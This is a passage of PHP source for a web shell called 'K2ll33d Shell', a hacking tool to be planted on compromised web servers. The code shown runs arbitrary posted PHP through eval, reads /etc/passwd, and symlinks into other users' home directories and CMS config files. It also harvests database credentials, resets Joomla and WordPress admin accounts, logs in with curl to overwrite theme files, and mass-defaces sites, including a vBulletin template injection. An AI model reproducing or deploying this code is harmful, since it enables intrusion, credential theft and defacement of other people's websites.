th{padding:3px 8px;font-weight:normal;color:#999999;} .explore th:hover , .phpinfo th:hover, th:hover{color:black;background:#00ff00;} .explore tr:hover{background:rgba(35,96,156,0.2);} .viewfile{background:#EDECEB;color:#000000;margin:4px 2px;padding:8px;} .sembunyi{display:none;padding:0;margin:0;} k, k a, k a:hover{text-shadow: 0pt 0pt 0.3em red;font-family:orbitron;font-size:25px;color:#ffffff;}</style><body onLoad="document.getElementById('cmd').focus();"><div class="main"><div class="head_info"> <table width="100%"><tr><td width="23%"><table class="b_tbl">
<?php echo strtoupper(
    base64_decode("PGgyIGNsYXNzPSJ0aXRsZSI+azJsbDMzZCBTaGVsbDwvaDI+ICA=")
); ?><div id="menu"><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=about">About Me</a></div>
</td></tr></table></td><td class="top" width='60%'><?php echo $buff; ?></td>&nbsp;&nbsp;<td style="width:20%;"><a>server ip : <?php echo $server_ip .
    "<br><br> your ip : " .
    $my_ip .
    "<br></a>"; ?><br><a href="?" style="border:1px solid #EC4D00;font:12px orbitron;width:200px;padding:0px 20px 0px 20px;">H O M E</a></td></tr></table></div>
<div id="menu"><ul class="menu"><a href="?<?php echo "y=" .
    $pwd; ?>">Files</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=shell">Shell</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=upload">upload</a><li><a>Sym</a><ul><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=sf">Symlink File</a></li><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=sec">Symlink server</a></li><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=configs">Get configs</a></li></ul></li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=php">Eval</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=back">Remote</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=mysql">Sql</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=mass">Mass</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=brute">Brute</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=phpinfo">PHP</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=zone-h">Zone-H</a><li><a>Joomla</a><ul><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=joomla">From keyboard</a></li><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=js">From symlink</a></li></ul></li><li><a>Wordpress</a><ul><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=keyboard">From Keyboard</a></li><li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=config">From Symlink</a></li></ul></li><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=vb">Vb</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=domains">Domains</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=string">String</a><a href="?<?php echo "y=" .
    $pwd; ?>&amp;x=boom">Boom</a>&nbsp;&nbsp;</ul></div><br><br>
<?php if (
    isset($_GET["x"]) &&
    $_GET["x"] == "php"
) { ?><form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"><table class="cmdbox"><tr><td><textarea class="output" name="cmd" id="cmd" cols=90> 
<?php if (isset($_POST["submitcmd"])) {
    echo eval(magicboom($_POST["cmd"]));
} else {
    echo "echo file_get_contents('/etc/passwd');";
} ?></textarea></td></tr><tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Do !" name="submitcmd" /></td></tr></form></table></form> <?php } elseif (
    isset($_GET["x"]) &&
    $_GET["x"] == "about"
) {
    echo '<center><br><br><div class="mybox"><br><h2 style="font-size:50px;" class="k2ll33d2">K2ll33d Shell</h2><k>By K2ll33d<br><br><br><a href=mailto:k2ll33d@live.fr>Mail</a>&nbsp;|&nbsp;<a href="http://facebook.com/k2ll33d" target="_blank">Facebook</a>&nbsp;|&nbsp;<a href="http://zone-h.org/archive/notifier=ReZK2LL" target="_blank">Zone-H</a></k><br><br><h3 style="font:25px orbitron;color:#ff0000;">' .
        date("Y") .
        "</h3></div></center>";
} elseif (isset($_GET["x"]) && $_GET["x"] == "sf") {
    @set_time_limit(0);
    @mkdir("sym", 0777);
    error_reporting(0);
    $htaccess =
        "Options all \n DirectoryIndex gaza.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $op = @fopen("sym/.htaccess", "w");
    fwrite($op, $htaccess);
    echo '<center><br><br><br><div class="mybox"><h2 class="k2ll33d2">Symlinker</h2><br><form method="post"> File Path:<br><input class="inputz" type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br>Symlink Name<br><input class="inputz" type="text" name="symfile" value="s.txt" size="60"/><br><br><input class="inputzbut" type="submit" value="symlink" name="symlink" /><br><br></form></div></center>';
    $target = $_POST["file"];
    $symfile = $_POST["symfile"];
    $symlink = $_POST["symlink"];
    if ($symlink) {
        @symlink("$target", "sym/$symfile");
        echo '<br><center><a target="_blank" href="sym/' .
            $symfile .
            '" >' .
            $symfile .
            "</a><br><br><br><br></center>";
    }
} elseif (isset($_GET["x"]) && $_GET["x"] == "js") {
    if ($_POST["symjo"]) {
        $config = file_get_contents($_POST["url"]);
        $user = $_POST["user"];
        $pass = md5($_POST["pass"]);
        function ex($text, $a, $b)
        {
            $explode = explode($a, $text);
            $explode = explode($b, $explode[1]);
            return $explode[0];
        }
        if ($config && ereg("JConfig", $config)) {
            $psswd = ex($config, '$password = \'', "';");
            $username = ex($config, '$user = \'', "';");
            $dbname = ex($config, '$db = \'', "';");
            $prefix = ex($config, '$dbprefix = \'', "';");
            $host = ex($config, '$host = \'', "';");
            $email = ex($config, '$mailfrom = \'', "';");
            $formn = ex($config, '$fromname = \'', "';");
            ($conn = mysql_connect($host, $username, $psswd)) or
                die(mysql_error());
            mysql_select_db($dbname, $conn) or
                die($username . " " . $psswd . " " . $host . " " . $dbname);
            $query = @mysql_query(
                "UPDATE `" .
                    $prefix .
                    "users` SET `username` ='" .
                    $user .
                    "' , `password` = '" .
                    $pass .
                    "', `usertype` = 'Super Administrator', `block` = 0"
            );
            if ($query) {
                echo '<center><h2 class="k2ll33d2">Done !</h2></center><br><table width="100%"><tr><th width="30%">site name</th><th width="20%">user</th><th width="20%">password</th><th width="20%">email</th></tr><tr><td width="20%"><font size="2" color="red">' .
                    $formn .
                    '</font></td><td width="20%">' .
                    $user .
                    '</td><td with="20%">' .
                    $_POST["pass"] .
                    '</td><td width="20%">' .
                    $email .
                    "</td></tr></table>";
            } else {
                echo '<h2 class="k2ll33d2"><font color="#ff0000">ERROR !</font></h2>';
            }
        } else {
            die(
                '<h2 class="k2ll33d2"><font color="red">Not a joomla config</font></h2>'
            );
        }
    } else {
         ?> <center><br><br><div class="mybox"><form method="post"><table><h2 class="k2ll33d2">Joomla login changer ( symlink version )</h2><tr><td>config link : </td><td><input class="inputz" type="text" name="url" value=""></td></tr><tr><td>new user : </td><td><input class="inputz" type="text" name="user" value="admin"></td></tr><tr><td>new password : </td><td><input class="inputz" type="text" name="pass" value="123123"></td></tr><tr><td><br></td></tr><tr><td><input type="submit" class="inputzbut" name="symjo" value="change"></td><br></tr></table></form></div></center><?php
    }
} elseif (isset($_GET["x"]) && $_GET["x"] == "sec") {
    $d0mains = @file("/etc/named.conf");
    if ($d0mains) {
        @mkdir("k2", 0777);
        @chdir("k2");
        @exe("ln -s / root");
        $file3 = 'Options all
DirectoryIndex Sux.html
AddType text/plain .php 
AddHandler server-parsed .php 
AddType text/plain .html 
AddHandler txt .html 
Require None 
Satisfy Any';
        $fp3 = fopen(".htaccess", "w");
        $fw3 = fwrite($fp3, $file3);
        @fclose($fp3);
        echo "<table align=center border=1 style='width:60%;border-color:#333333;'><tr><td align=center><font size=3>S. No.</font></td><td align=center><font size=3>Domains</font></td><td align=center><font size=3>Users</font></td><td align=center><font size=3>Symlink</font></td></tr>";
        $dcount = 1;
        foreach ($d0mains as $d0main) {
            if (eregi("zone", $d0main)) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    $user = posix_getpwuid(
                        @fileowner("/etc/valiases/" . $domains[1][0])
                    );
                    echo "<tr align=center><td><font size=3>" .
                        $dcount .
                        "</font></td><td align=left><a href=http://www." .
                        $domains[1][0] .
                        "/><font class=txt>" .
                        $domains[1][0] .
                        "</font></a></td><td>" .
                        $user["name"] .
                        "</td><td><a href='/k2/root/home/" .
                        $user["name"] .
                        "/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
                    flush();
                    $dcount++;
                }
            }
        }
        echo "</table>";
    } else {
        $TEST = @file("/etc/passwd");
        if ($TEST) {
            @mkdir("k2", 0777);
            @chdir("k2");
            exe("ln -s / root");
            echo "<br><br><table align=center border=1><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";
            $dcount = 1;
            ($file = fopen("/etc/passwd", "r")) or exit("Unable to open file!");
            while (!feof($file)) {
                $s = fgets($file);
                $matches = [];
                $t = preg_match("/\/(.*?)\:\//s", $s, $matches);
                $matches = str_replace("home/", "", $matches[1]);
                if (
                    strlen($matches) > 12 ||
                    strlen($matches) == 0 ||
                    $matches == "bin" ||
                    $matches == "etc/X11/fs" ||
                    $matches == "var/lib/nfs" ||
                    $matches == "var/arpwatch" ||
                    $matches == "var/gopher" ||
                    $matches == "sbin" ||
                    $matches == "var/adm" ||
                    $matches == "usr/games" ||
                    $matches == "var/ftp" ||
                    $matches == "etc/ntp" ||
                    $matches == "var/www" ||
                    $matches == "var/named"
                ) {
                    continue;
                }
                echo "<tr><td align=center><font size=3>" .
                    $dcount .
                    "</td><td align=center><font class=txt>" .
                    $matches .
                    "</td>";
                echo "<td align=center><font class=txt><a href=/k2/root/home/" .
                    $matches .
                    "/public_html target='_blank'>Symlink</a></td></tr>";
                $dcount++;
            }
            fclose($file);
            echo "</table>";
        } else {
            if ($os != "Windows") {
                @mkdir("k2", 0777);
                @chdir("k2");
                @exe("ln -s / root");
                echo "<br><br><center><div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2><table align=center border=1><tr><td align=center><font size=4>id</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";
                $temp = "";
                $val1 = 0;
                $val2 = 1000;
                for (; $val1 <= $val2; $val1++) {
                    $uid = @posix_getpwuid($val1);
                    if ($uid) {
                        $temp .= join(":", $uid) . "\n";
                    }
                }
                echo "<br/>";
                $temp = trim($temp);
                $file5 = fopen("test.txt", "w");
                fputs($file5, $temp);
                fclose($file5);
                $dcount = 1;
                ($file = fopen("test.txt", "r")) or
                    exit("Unable to open file!");
                while (!feof($file)) {
                    $s = fgets($file);
                    $matches = [];
                    $t = preg_match("/\/(.*?)\:\//s", $s, $matches);
                    $matches = str_replace("home/", "", $matches[1]);
                    if (
                        strlen($matches) > 12 ||
                        strlen($matches) == 0 ||
                        $matches == "bin" ||
                        $matches == "etc/X11/fs" ||
                        $matches == "var/lib/nfs" ||
                        $matches == "var/arpwatch" ||
                        $matches == "var/gopher" ||
                        $matches == "sbin" ||
                        $matches == "var/adm" ||
                        $matches == "usr/games" ||
                        $matches == "var/ftp" ||
                        $matches == "etc/ntp" ||
                        $matches == "var/www" ||
                        $matches == "var/named"
                    ) {
                        continue;
                    }
                    echo "<tr><td align=center><font size=3>" .
                        $dcount .
                        "</td><td align=center><font class=txt>" .
                        $matches .
                        "</td>";
                    echo "<td align=center><font class=txt><a href=/k2/root/home/" .
                        $matches .
                        "/public_html target='_blank'>Symlink</a></td></tr>";
                    $dcount++;
                }
                fclose($file);
                echo "</table></div></center>";
                unlink("test.txt");
            } else {
                echo "<center><font size=4>Cannot create Symlink</font></center>";
            }
        }
    }
} elseif (isset($_GET["x"]) && $_GET["x"] == "mass") {
    error_reporting(
        0
    ); ?><center><br><br><div class="mybox"><h2 class="k2ll33d2">Folder Mass Defacer</h2><center/><br><center><form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=post>Folder :<br/><input class="inputz" typ=text name=path size=60 value="<?= getcwd() ?>"><br>File Name :<br/><input class="inputz" typ=text name=file size=60 value="index.php"><br>index URL :<br/><input class="inputz" typ=text name=url size=60 value=""><br><input class="inputzbut" type=submit value=Deface></form></div></center><?php
@error_reporting(0);
$mainpath = $_POST[path];
$file = $_POST[file];
$indexurl = $_POST[url];
echo "<br>";
$dir = opendir("$mainpath");
while ($row = readdir($dir)) {
    $start = @fopen("$row/$file", "w+");
    $code = @file_get_contents($indexurl);
    $finish = @fwrite($start, $code);
    if ($finish) {
        echo "&#187; $row/$file  &#187; Done<br><br>";
    }
}

} elseif (isset($_GET["x"]) && $_GET["x"] == "vb") {
    if (empty($_POST["index"])) {
        echo "<center><br><br><div width='100%' class='mybox'><br><h2 class='k2ll33d2'>Vbulletin index changer</h2><br><FORM method='POST'>host : <INPUT size='12' class='inputz' value='localhost' name='localhost' type='text'>&nbsp;|&nbsp;database : <INPUT class='inputz' size='12' value='db_name' name='database' type='text'>&nbsp;|&nbsp;username : <INPUT class='inputz' size='10' value='db_user' name='username' type='text'>&nbsp;|&nbsp;password : <INPUT class='inputz' size='10' value='bd_pass' name='password' type='text'>&nbsp;|&nbsp;perfix : <input class='inputz' size='10' value='' name='perfix' type='text'><br><br><textarea class='inputz' name='index' cols='40' rows='10'>Hacked By ReZK2LL Team</textarea><br><INPUT class='inputzbut' value='Deface' name='send' type='submit'></FORM></div></center>";
    } else {
        $localhost = $_POST["localhost"];
        $database = $_POST["database"];
        $username = $_POST["username"];
        $password = $_POST["password"];
        $perfix = $_POST["perfix"];
        $index = $_POST["index"];
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        $index = str_replace("\'", "'", $index);
        $set_index = "{\${eval(base64_decode(\'";
        $set_index .= base64_encode("echo '$index';");
        $set_index .= "\'))}}{\${exit()}}</textarea>";
        ($ok = @mysql_query(
            "UPDATE " .
                $perfix .
                "template SET template ='" .
                $set_index .
                "' WHERE title ='FORUMHOME'"
        )) or die(mysql_error());
        if ($ok) {
            echo "Defaced<br><br>";
        }
    }
} elseif (isset($_GET["x"]) && $_GET["x"] == "boom") {
    error_reporting(0);
    function entre2v2($text, $marqueurDebutLien, $marqueurFinLien, $i = 1)
    {
        $ar0 = explode($marqueurDebutLien, $text);
        $ar1 = explode($marqueurFinLien, $ar0[$i]);
        return trim($ar1[0]);
    }
    function randomt()
    {
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((float) microtime() * 1000000);
        $i = 0;
        $pass = "";
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
        return $pass;
    }
    function index_changer_wp($conf, $content)
    {
        $output = "";
        $dol = '$';
        $go = 0;
        $username = entre2v2($conf, "define('DB_USER', '", "');");
        $password = entre2v2($conf, "define('DB_PASSWORD', '", "');");
        $dbname = entre2v2($conf, "define('DB_NAME', '", "');");
        $prefix = entre2v2($conf, $dol . "table_prefix  = '", "'");
        $host = entre2v2($conf, "define('DB_HOST', '", "');");
        $link = mysql_connect($host, $username, $password);
        if ($link) {
            mysql_select_db($dbname, $link);
            $dol = '$';
            $req1 = mysql_query(
                "UPDATE `" .
                    $prefix .
                    "users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1"
            );
        } else {
            $output .= "[-] DB Error<br />";
        }
        if ($req1) {
            $req = mysql_query(
                "SELECT * from  `" .
                    $prefix .
                    "options` WHERE option_name='home'"
            );
            $data = mysql_fetch_array($req);
            $site_url = $data["option_value"];
            $req = mysql_query(
                "SELECT * from  `" .
                    $prefix .
                    "options` WHERE option_name='template'"
            );
            $data = mysql_fetch_array($req);
            $template = $data["option_value"];
            $req = mysql_query(
                "SELECT * from  `" .
                    $prefix .
                    "options` WHERE option_name='current_theme'"
            );
            $data = mysql_fetch_array($req);
            $current_theme = $data["option_value"];
            $useragent =
                "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
            $url2 = $site_url . "/wp-login.php";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url2);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt(
                $ch,
                CURLOPT_POSTFIELDS,
                "log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1"
            );
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
            curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
            $buffer = curl_exec($ch);
            $pos = strpos($buffer, "action=logout");
            if ($pos === false) {
                $output .= "[-] Login Error<br />";
            } else {
                $output .= "[+] Login Successful<br />";
                $go = 1;
            }
            if ($go) {
                $cond = 0;
                $url2 =
                    $site_url .
                    "/wp-admin/theme-editor.php?file=/themes/" .
                    $template .
                    "/index.php&theme=" .
                    urlencode($current_theme) .
                    "&dir=theme";
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
                curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
                $buffer0 = curl_exec($ch);
                $_wpnonce = entre2v2(
                    $buffer0,
                    '<input type="hidden" id="_wpnonce" name="_wpnonce" value="',
                    '" />'
                );
                $_file = entre2v2(
                    $buffer0,
                    '<input type="hidden" name="file" value="',
                    '" />'
                );
                if (substr_count($_file, "/index.php") != 0) {
                    $output .= "[+] index.php loaded in Theme Editor<br />";
                    $url2 = $site_url . "/wp-admin/theme-editor.php";
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt(
                        $ch,
                        CURLOPT_POSTFIELDS,
                        "newcontent=" .
                            base64_decode($content) .
                            "&action=update&file=" .
                            $_file .
                            "&_wpnonce=" .
                            $_wpnonce .
                            "&submit=Update File"
                    );
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
                    curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
                    $buffer = curl_exec($ch);
                    curl_close($ch);
                    $pos = strpos(
                        $buffer,
                        '<div id="message" class="updated">'
                    );
                    if ($pos === false) {
                        $output .= "[-] Updating Index.php Error<br />";
                    } else {
                        $output .= "[+] Index.php Updated Successfuly<br />";
                        $hk = explode("public_html", $_file);
                        $output .=
                            "[+] Deface " .
                            file_get_contents(
                                $site_url . str_replace("/blog", "", $hk[1])
                            );
                        $cond = 1;
                    }
                } else {
                    $url2 =
                        $site_url .
                        "/wp-admin/theme-editor.php?file=index.php&theme=" .
                        $template;
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
                    curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
                    $buffer0 = curl_exec($ch);
                    $_wpnonce = entre2v2(
                        $buffer0,
                        '<input type="hidden" id="_wpnonce" name="_wpnonce" value="',
                        '" />'
                    );
                    $_file = entre2v2(
                        $buffer0,
                        '<input type="hidden" name="file" value="',
                        '" />'
                    );
                    if (substr_count($_file, "index.php") != 0) {
                        $output .= "[+] index.php loaded in Theme Editor<br />";
                        $url2 = $site_url . "/wp-admin/theme-editor.php";
                        curl_setopt($ch, CURLOPT_URL, $url2);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt(
                            $ch,
                            CURLOPT_POSTFIELDS,
                            "newcontent=" .
                                base64_decode($content) .
                                "&action=update&file=" .
                                $_file .
                                "&theme=" .
                                $template .
                                "&_wpnonce=" .
                                $_wpnonce .
                                "&submit=Update File"
                        );
                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                        curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
                        curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
                        $buffer = curl_exec($ch);
                        curl_close($ch);
                        $pos = strpos(
                            $buffer,
                            '<div id="message" class="updated">'
                        );
                        if ($pos === false) {
                            $output .= "[-] Updating Index.php Error<br />";
                        } else {
                            $output .=
                                "[+] Index.php Template Updated Successfuly<br />";
                            $output .=
                                "[+] Deface " .
                                file_get_contents(
                                    $site_url .
                                        "/wp-content/themes/" .
                                        $template .
                                        "/index.php"
                                );
                            $cond = 1;
                        }
                    } else {
                        $output .=
                            "[-] index.php can not load in Theme Editor<br />";
                    }
                }
            }
        } else {
            $output .= "[-] DB Error<br />";
        }
        global $base_path;
        unlink($base_path . "COOKIE.txt");
        return ["cond" => $cond, "output" => $output];
    }
    function index_changer_joomla($conf, $content, $domain)
    {
        $doler = '$';
        $username = entre2v2($conf, $doler . "user = '", "';");
        $password = entre2v2($conf, $doler . "password = '", "';");
        $dbname = entre2v2($conf, $doler . "db = '", "';");
        $prefix = entre2v2($conf, $doler . "dbprefix = '", "';");
        $host = entre2v2($conf, $doler . "host = '", "';");
        $co = randomt();
        $site_url = "http://" . $domain . "/administrator";
        $output = "";
        $cond = 0;
        $link = mysql_connect($host, $username, $password);
        if ($link) {
            mysql_select_db($dbname, $link);
            $req1 = mysql_query(
                "UPDATE `" .
                    $prefix .
                    "users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0"
            );
            $req = mysql_numrows(
                mysql_query("SHOW TABLES LIKE '" . $prefix . "extensions'")
            );
        } else {
            $output .= "[-] DB Error<br />";
        }
        if ($req1) {
            if ($req) {
                $req = mysql_query(
                    "SELECT * from  `" .
                        $prefix .
                        "template_styles` WHERE `client_id` = '0' and `home` = '1'"
                );
                $data = mysql_fetch_array($req);
                $template_name = $data["template"];
                $req = mysql_query(
                    "SELECT * from  `" .
                        $prefix .
                        "extensions` WHERE `name`='" .
                        $template_name .
                        "' or `element` = '" .
                        $template_name .
                        "'"
                );
                $data = mysql_fetch_array($req);
                $template_id = $data["extension_id"];
                $url2 = $site_url . "/index.php";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $return = entre2v2(
                    $buffer,
                    '<input type="hidden" name="return" value="',
                    '"'
                );
                $hidden = entre2v2(
                    $buffer,
                    '<input type="hidden" name="',
                    '" value="1"',
                    4
                );
                if ($return && $hidden) {
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_REFERER, $url2);
                    curl_setopt(
                        $ch,
                        CURLOPT_POSTFIELDS,
                        "username=admin&passwd=123123&option=com_login&task=login&return=" .
                            $return .
                            "&" .
                            $hidden .
                            "=1"
                    );
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                    $buffer = curl_exec($ch);
                    $pos = strpos($buffer, "com_config");
                    if ($pos === false) {
                        $output .= "[-] Login Error<br />";
                    } else {
                        $output .= "[+] Login Successful<br />";
                    }
                }
                if ($pos) {
                    $url2 =
                        $site_url .
                        "/index.php?option=com_templates&task=source.edit&id=" .
                        base64_encode($template_id . ":index.php");
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                    $buffer = curl_exec($ch);
                    $hidden2 = entre2v2(
                        $buffer,
                        '<input type="hidden" name="',
                        '" value="1"',
                        2
                    );
                    if ($hidden2) {
                        $output .=
                            "[+] index.php file found in Theme Editor<br />";
                    } else {
                        $output .=
                            "[-] index.php Not found in Theme Editor<br />";
                    }
                }
                if ($hidden2) {
                    $url2 =
                        $site_url .
                        "/index.php?option=com_templates&layout=edit";
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt(
                        $ch,
                        CURLOPT_POSTFIELDS,
                        "jform[source]=" .
                            $content .
                            "&jform[filename]=index.php&jform[extension_id]=" .
                            $template_id .
                            "&" .
                            $hidden2 .
                            "=1&task=source.save"
                    );
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                    $buffer = curl_exec($ch);
                    curl_close($ch);
                    $pos = strpos($buffer, '<dd class="message message">');
                    $cond = 0;
                    if ($pos === false) {
                        $output .= "[-] Updating Index.php Error<br />";
                    } else {
                        $output .=
                            "[+] Index.php Template successfully saved<br />";
                        $cond = 1;
                    }
                }
            } else {
                $req = mysql_query(
                    "SELECT * from  `" .
                        $prefix .
                        "templates_menu` WHERE client_id='0'"
                );
                $data = mysql_fetch_array($req);
                $template_name = $data["template"];
                $useragent =
                    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
                $url2 = $site_url . "/index.php";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $hidden = entre2v2(
                    $buffer,
                    '<input type="hidden" name="',
                    '" value="1"',
                    3
                );
                if ($hidden) {
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt(
                        $ch,
                        CURLOPT_POSTFIELDS,
                        "username=admin&passwd=123456&option=com_login&task=login&" .
                            $hidden .
                            "=1"
                    );
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                    $buffer = curl_exec($ch);
                    $pos = strpos($buffer, "com_config");
                    if ($pos === false) {
                        $output .= "[-] Login Error<br />";
                    } else {
                        $output .= "[+] Login Successful<br />";
                    }
                }
                if ($pos) {
                    $url2 =
                        $site_url .
                        "/index.php?option=com_templates&task=edit_source&client=0&id=" .
                        $template_name;
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                    $buffer = curl_exec($ch);
                    $hidden2 = entre2v2(
                        $buffer,
                        '<input type="hidden" name="',
                        '" value="1"',
